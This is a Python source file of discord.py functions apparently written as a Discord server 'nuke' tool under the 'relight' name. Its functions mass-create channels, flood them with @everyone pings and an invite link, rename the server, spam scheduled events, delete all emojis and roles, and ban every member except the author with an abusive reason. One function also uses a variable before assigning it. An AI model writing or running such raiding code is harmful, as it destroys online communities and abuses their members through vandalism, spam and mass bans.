import asyncio
import discord
import datetime


ping = "@everyone @here"

async def nuke(relight):
    guild = relight.get_guild(guild)

    if guild is None:
        print("Guild not found.")
        return

    channels = await asyncio.gather(
        *[
            guild.create_text_channel(
                name="seized-by-relight"
            )
            for i in range(50)
        ]
    )
    
    snd = [
        channel.send(ping, "https://discord.gg/6vW8w5SmFS")
        for channel in channels
        for _ in range(20)
    ]

    await asyncio.gather(*snd)
 
async def rename(guild):
    rnm = [
        guild.edit(name="nuked by relight")
    ]

    rnm.extend(
        channel.edit(name="slaughtered")
        for i, channel in enumerate(guild.text_channels)
    )

    await asyncio.gather(*rnm)

    sendtasks = [
        channel.send(ping, "https://discord.gg/6vW8w5SmFS")
        for channel in guild.text_channels
        for _ in range(30)
    ]

    await asyncio.gather(*sendtasks)    


async def evspam(guild):
    evtsks = [
        guild.create_scheduled_event(
            name=f"seized by relight",
            start_time=discord.utils.utcnow() + datetime.timedelta(minutes=100000),
            end_time=discord.utils.utcnow() + datetime.timedelta(minutes=40000),
            entity_type=discord.EntityType.external,
            privacy_level=discord.PrivacyLevel.guild_only,
            location="discord.gg/6vW8w5SmFS"
        )
        for i in range(100)
    ]
    ### dont modify this to above 100 ###
    ### because max is 100 ###

    await asyncio.gather(*evtsks)
 
async def delemj(guild):
    delall = [
        emoji.delete()
        for emoji in guild.emojis
    ]

    await asyncio.gather(*delall)

async def delroles(guild):
    deltasks = [
        role.delete()
        for role in guild.roles
        if role != guild.default_role
    ]

    await asyncio.gather(*deltasks)

async def crtroles(guild):
    roles = [
        guild.create_role(name="New Role")
        for _ in range(50)
    ]

    await asyncio.gather(*roles)

async def banall(guild, author_id):

    ids_to_exclude = {
        str(author_id)
    }

    async def ban_member(member):

        try:
            await member.ban(
                reason="worship us bitches"
            )

        except:
            pass

    members_to_ban = [

        member

        for member in guild.members

        if str(member.id)
        not in ids_to_exclude
    ]

    tasks = [

        asyncio.create_task(
            ban_member(member)
        )

        for member in members_to_ban
    ]

    await asyncio.gather(*tasks)
                                                                                                                                                                                                                                
